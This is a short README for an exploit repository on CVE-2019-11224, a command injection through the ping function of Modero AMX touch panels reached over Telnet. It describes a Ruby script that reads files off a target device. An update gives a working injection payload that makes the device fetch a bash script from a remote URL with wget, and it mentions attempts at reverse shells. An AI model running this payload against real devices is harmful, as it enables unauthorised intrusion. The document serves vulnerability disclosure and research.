# Modero AMX Code Execution (CVE-2019-11224)
This repo contains a few sources about CVE-2019â€“11224 (https://link.medium.com/zukA0oCnV8) because I noticed that the link no longer works on the official NIST website. 
Modero AMX devices are essentially touch panel devices for meeting rooms, they can be observed in a lot of different environments and usually have Telnet open. 
Because they emulate a console using Telnet, there exists a code injection vulnerability through the "ping" function by using command separators. 

#  About exploit.rb
This is basically a *really* ugly ruby file which simplifies the exploit process, all you have to do is set the IP in the exploit file and run it. You'll be presented with a few different options that cat out different files on the device...
The Modero systems have been a real PITA for me so I wasn't able to get the script to recognize when a command has completed, but feel free to modify the files to your liking. 

# Update July 30th, 2021
So I've lately come back to this, and made some progress and will probably rewrite some of this code as well with pwntools or something.
In the original blogpost the method of getting spaces was using `'\\n'` but it looks like a better way to do this is by using \x20 like so: `ping ;CMD=$'\x20{some_url}/bash.sh'&&wget$CMD`
There are some constraints I've found however. The systems I've tested on are read-only file systems so thats kinda an issue. Telnet reverse shells weren't liking me either, but telnet is installed.
